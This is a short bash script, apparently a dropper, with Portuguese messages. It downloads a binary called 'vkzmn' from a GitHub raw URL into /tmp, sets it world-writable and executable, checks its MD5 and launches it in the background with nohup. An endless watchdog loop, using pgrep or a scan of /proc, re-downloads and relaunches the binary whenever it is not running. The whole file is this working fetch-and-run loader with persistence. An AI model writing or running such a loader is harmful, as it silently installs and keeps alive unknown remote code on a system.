#!//bin/bash



 


url='https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn'


execute_vkzmn() {


chmod_ok=0


chmod 777 /tmp/vkzmn

if (( $? )) ; then

echo  erro  em aplica  a permissao no vkzmn

exit

else 

chmod_ok=1

fi ; 

if  (( $chmod_ok ))  ; then

nohup  /tmp/vkzmn  &

fi ;




}


down_wget() {

wget   $url    -O  /tmp/vkzmn


return


}

#####################################################



check_wget() {


command -v wget 


if (( $? )) ; then #if last err not  0  wget not found


echo wget  not found


else


echo  wget encontrado


down_wget     


fi;

}









check_file() {


vkzmn_in_tmp=0

echo verificando se vkzmn  ja esta em /tmp

ls /tmp/vkzmn  
 
if (( $? )) ; then

echo vkzmn nao esta em //tmp

check_wget

else 

vkzmn_in_tmp=1

fi ;

if (( $vkzmn_in_tmp )) ; then 

echo vkzmn ja esta em //tmp

magic 

fi;

}



magic() {  #check  if file is elf


hash=0

echo checando  a integridade do arquivo

command -v  md5sum
 
if (( $?  )) ; then

echo md5sum nao encontrado

exit #use  od 

fi;

md5=$( md5sum /tmp/vkzmn )


for  m  in $md5 ; do  


if [[ $m = '002ab35974600f09c26abe5b15ad11f4' ]] ; then

hash=1

fi;

done


if (( $hash )) ; then


echo binario conhecido

execute_vkzmn

fi ;



if  [  $hash  -eq   0  ]   ; then 


echo binario  desconecido


check_wget


fi ; 

}


# -------------------------------------------


proc() {


true=1000

while true ; do

vkzmn_ok=0

dir_proc=$( ls  /proc )
 
for  pid  in   $dir_proc ; do

if  ((  $pid  >  0  )) ; then #get only numbers

comm=$( cat  /proc/$pid/comm )
 
for  cc in  $comm ; do
 
if [ $cc  =  "vkzmn" ] ; then

vkzmn_ok=$true

fi ; 

done

fi; 

done


if   [  $vkzmn_ok   -eq    $true   ]  ; then

echo vkzmn_ok

else 

echo  vkzmn_not_ok

check_file   


fi ; 

done


} 

###############################





pg() {


vkzmn_ok=0

pgrep=0


#simple verification

command -v pgrep  


if (( $? )) ; then #if last err not 0 pgrep not instaled


echo pgrep not instaled
 

proc

else 


pgrep=1


fi ; 

if [ $pgrep -eq 1 ]  ; then

pgrep  vkzmn 
 

if (( $? )) ; then


echo  vkmzn nao esta em execucao


check_file


else 


echo vkzmn ja esta em execucao


fi;


fi;

}








init() {



while  true ; do

pg

done

}




init
